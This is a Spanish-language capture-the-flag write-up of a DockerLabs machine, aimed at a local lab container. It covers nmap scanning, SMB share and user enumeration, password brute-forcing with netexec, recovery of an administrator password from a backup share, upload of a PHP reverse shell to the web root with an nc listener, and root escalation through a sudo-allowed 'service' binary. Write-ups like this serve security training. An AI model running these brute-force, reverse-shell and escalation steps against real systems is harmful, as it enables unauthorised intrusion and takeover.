Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #dockerlabs #smb #brute-force

![](../assets/Pasted image 20251110203526.png)

## Reconocimiento

Comienzo tirando un ping para comprobar conectividad:
```bash
> ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=3.27 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 3.274/3.274/3.274/0.000 ms
```

Ahora comenzamos tirando un escaneo con nmap para ver que puertos están abiertos
```bash
> nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv 172.17.0.2
-------------------------------------------------------------
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 32:99:3C:A5:58:17 (Unknown)
```
- Vemos el puerto 80 HTTP, 22 SSH,  139 y 445 SMB.


Procedemos a tirar un segundo escaneo con nmap para ver que servicios y versiones están corriendo:
```bash
> nmap -p 22,80,139,445 -sCV --min-rate 5000 -Pn -n -vvv -sS 172.17.0.2 -oN target.txt
---------------------------------------------------------------------------------------
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:a1:09:2d:be:05:58:1b:01:20:d7:d0:d8:0d:7b:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrGDto+yIluWWc28CO9WLop39MgTQepDrYpDWvwqPgqpC2Ea8ZtGQCObWL21GlJITWAdFSZS0HaWuo1Wl9nZ84=
|   256 cd:98:0b:8a:0b:f9:f5:43:e4:44:5d:33:2f:08:2e:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICk8CRYpvJnqRBsGb/f/ZxXJoTikc4EQdeCBsvENuMwD
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
MAC Address: 32:99:3C:A5:58:17 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Puerto 22 SSH: OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
- Puerto 80 HTTP: Apache httpd 2.4.58 ((Ubuntu))
- Puerto 139 y 445:  Samba smbd 4.6.2

## Enumeración

**Puerto 80**

- Simple pagina de login
![](../assets/Pasted image 20251110204129.png)

Realizamos fuzzing para descubrir recursos:
```bash
> gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://172.17.0.2/ -x html,php,py,js,txt,json
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/info.php             (Status: 200) [Size: 72710]
/index.php            (Status: 200) [Size: 3543]
/server-status        (Status: 403) [Size: 275]
/productos.php        (Status: 200) [Size: 5229]
/index.php            (Status: 200) [Size: 3543]
```

**Info.php**

- en _disable_functions_ no hay ninguna función deshabilitada
![](../assets/Pasted image 20251110204600.png)
**productos.php**

- Es al parecer la pagina principal, voy a supone que es aquí a donde te redirigue cuando te logeas.
![](../assets/Pasted image 20251110204745.png)

**Puertos 139, 445 Servicio SMB**
Enumere los recursos compartidos disponibles con smbmap y me encuentro con un recurso read-only al cual puedo acceder
```bash
> smbmap -H 172.17.0.2
[+] IP: 172.17.0.2:445	Name: pressenter.hl                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	myshare                                           	READ ONLY	Carpeta compartida sin restricciones
	backup24                                          	NO ACCESS	Privado
	home                                              	NO ACCESS	Produccion
	IPC$                                              	NO ACCESS	IPC Service (EseEmeB Samba Server)
```

Procedo a conectarme al recurso, y listar el contenido:
- Aquí es donde me encuentro un archivito llamdo _access.txt_
```bash
> smbclient //172.17.0.2/myshare -N
> smb: \> ls
  .                                   D        0  Sun Oct  6 16:26:40 2024
  ..                                  D        0  Sun Oct  6 16:26:40 2024
  access.txt                          N      956  Sun Oct  6 00:46:26 2024
```

Bajo el archivo y lo inspecciono:
```bash
smb: \> get access.txt
smb: \> exit
> cat access.txt
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InNhdHJpYW5pN0Blc2VlbWViLmRsIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MjgxNjAzNzMsImV4cCI6MTcyODE2Mzk3MywiandrIjp7Imt0eSI6IlJTQSIsIm4iOiI2MzU4NTI5OTgwNzk4MDM4NzI2MjQyMzYxMjc2NTg2NjE3MzU1MzUyMTMxNjU0ODI2NDI1ODg4NDkzNTU1NDYxNTIyNTc1NTAwNjY0ODY2MDM4OTY4ODMwNTk4OTY0NjUxOTQ2NDEzMzU4OTI1MzU2OTM4MDQwMTE1MjQzMDg4MTg0NTg1MzQxMzY5NTQyNTgxNTQwOTc3MjMzMjU0MTQxNzQ5NzczNDQyODkwNjc3ODY2MjI3NzUyMzEzMzg2OTk1NzA1ODAxNzM0NjA2NDE1NjkyNTM5MjAyNzc5OTczMjczODgyNTc1NTUwMTIwMDc4NjUzNDc0MTU1MjMyMjkwMDAxNjM4NTIwMTExNTUyNjE1NDkwMjQyOTYyMDA4MjYxNDI4NzA0MjAxNjcwOTg0NDUyMjY1NzcwNyIsImUiOjY1NTM3fX0.bQhS5qLCv5bf3sy-oHS7ZGcqqjk3LqyJ5bv-Jw6DIIoSIkmBtiocq07F7joOeKRxS3roWdHEuZUMeHQfWTHwRH7pHqCIBVJObdvHI8WR_Gac_MPYvwd6aSAoNExSlZft1-hXJUWbUIZ683JqEg06VYIap0Durih2rUio4Bdzv68JIo_3M8JFMV6kQTHnM3CElKy-UdorMbTxMQdUGKLk_4C7_FLwrGQse1f_iGO2MTzxvGtebQhERv-bluUYGU3Dq7aJCNU_hBL68EHDUs0mNSPF-f_FRtdENILwF4U14PSJiZBS3e5634i9HTmzRhvCGAqY00isCJoEXC1smrEZpg
```
- El parecer es un token JWT pero que no me sirve de nada.


Ahora, me decido por usar `enum4linux` para listar posibles usuarios del servicio SMB a los cuales yo pueda realizarles un ataque de fuerza bruta.
```bash
> enum4linux -a 172.17.0.2
--------------------------------------------------------------------------------------------------------------
> [+] Enumerating users using SID S-1-5-21-3519099135-2650601337-1395019858 and logon username '', password ''

S-1-5-21-3519099135-2650601337-1395019858-501 SAMBASERVER\nobody (Local User)
S-1-5-21-3519099135-2650601337-1395019858-513 SAMBASERVER\None (Domain Group)
S-1-5-21-3519099135-2650601337-1395019858-1000 SAMBASERVER\usuario1 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1001 SAMBASERVER\usuario2 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1002 SAMBASERVER\usuario3 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1003 SAMBASERVER\satriani7 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1004 SAMBASERVER\administrador (Local User)
```
- Nos interesa el user satriani7 y adminstrador
## Explotación


Con `netexec` realizamos un ataque de fuerza bruta al usuario `satriani7`

```bash
> nxc smb 172.17.0.2 -u satriani7 -p /usr/share/wordlists/rockyou.txt
---------------------------------------------------------------------------
SMB         172.17.0.2      445    SAMBASERVER      [+] SAMBASERVER\satriani7:50cent
```
- Contraseña 50cent

Listo los recursos a los que tiene acceso satriani7
- Aquí veo que tengo permisos de lectura al recurso _backup_
```bash
> smbmap -H 172.17.0.2 -u satriani7 -p 50cent
[+] IP: 172.17.0.2:445	Name: pressenter.hl                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	myshare                                           	READ ONLY	Carpeta compartida sin restricciones
	backup24                                          	READ ONLY	Privado
	home                                              	NO ACCESS	Produccion
	IPC$                                              	NO ACCESS	IPC Service (EseEmeB Samba Server)
```

Entonces ahora me conecto al servicio smb al recurso backup24
```bash
> smbclient //172.17.0.2/backup24 -U satriani7%50cent
```

Dentro del recurso _backup_, había un montón de directorios y archivos pero después de buscar me encontré con 2 archivos interesantes
- _credentials.txt_ - Path /Documents/Personal
- _notes.txt_ - Path /Documents/Personal
```bash
> smb: \Documents\Personal\> get credentials.txt
> smb: \Documents\Personal\> get notes.txt
> 
```

_credentials.txt_ tenia varias credenciales entre ellas la de administrador
```bash
> cat credentials.txt 
# Archivo de credenciales

Este documento expone credenciales de usuarios, incluyendo la del usuario administrador.
7. Usuario: administrador
    - Contraseña: Adm1nP4ss2024 
```

Procedí a volver listar los recursos a los que tengo acceso pero ahora con el usuario administrador.
```bash
> smbmap -H 172.17.0.2 -u administrador -p Adm1nP4ss2024
[+] IP: 172.17.0.2:445	Name: pressenter.hl                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	myshare                                           	READ ONLY	Carpeta compartida sin restricciones
	backup24                                          	NO ACCESS	Privado
	home                                              	READ, WRITE	Produccion
	IPC$                                              	NO ACCESS	IPC Service (EseEmeB Samba Server)
```

Tengo acceso al recurso _home_ con permisos de lectura/escritura por lo cual procedo a conectarme.
```bash
> smbclient //172.17.0.2/home -U administrador%Adm1nP4ss2024
```

Lo primero que hago es ver que recursos existen:
```bash
> smb: \> ls
  .                                   D        0  Mon Nov 10 21:30:21 2025
  ..                                  D        0  Mon Nov 10 21:30:21 2025
  info.php                            N       21  Sun Oct  6 01:32:50 2024
  back.png                            N   463383  Sun Oct  6 01:59:29 2024
  index.php                           N     3543  Sun Oct  6 14:28:45 2024
  productos.php                       N     5229  Sun Oct  6 03:21:48 2024
  styles.css                          N      263  Sun Oct  6 03:22:06 2024
```

Al parecer todos estos recursos corresponden al servicio apache el cual corre por el puerto 80, por lo cual ahora se me ocurren 2 opciones.
- Crear una webshell, ya que el _info.php_ me indica que no hay ninguna función deshabilitado por lo cual podría ejecutar comandos en el navegador
- Directamente entablarme una reverse_shell

Me decido por la segundo opción. Por lo cual ahora me bajo la reverse-shell de PentestMonkey [Link](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php) en mi sistema y la subo al SMB
```bash
smb: \> put php-reverse-shell.php
putting file php-reverse-shell.php as \php-reverse-shell.php (2681.0 kb/s) (average 1340.6 kb/s)
```

Ahora, me pongo en escucha y me dirijo a la dirección donde debería de estar alojado mi reverse shell: `http://172.17.0.2/php-reverse-shell.php`

```bash
> sudo nc -nlvp 443
-------------------------------------------------------------------------------------------------------------------------
Connection received on 172.17.0.2 56350
Linux 0318689382b0 6.12.32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.32-1parrot1 (2025-06-27) x86_64 x86_64 x86_64 GNU/Linux
 03:39:38 up  5:12,  0 user,  load average: 0.92, 1.14, 1.94
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
## Escalada de Privilegios

Dentro del sistema lo primero que hice fue listar binarios que pudiera ejecutar como root:
```bash
www-data@0318689382b0:/$ sudo -l

User www-data may run the following commands on 0318689382b0:
    (ALL) NOPASSWD: /usr/sbin/service
```

Encuentro el binario _service_ y con ayuda de GTFObins lo exploto.
```bash
www-data@0318689382b0:/$ sudo /usr/sbin/service ../../bin/sh              
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)

```

![](../assets/Pasted image 20251110214639.png)

***PWNED*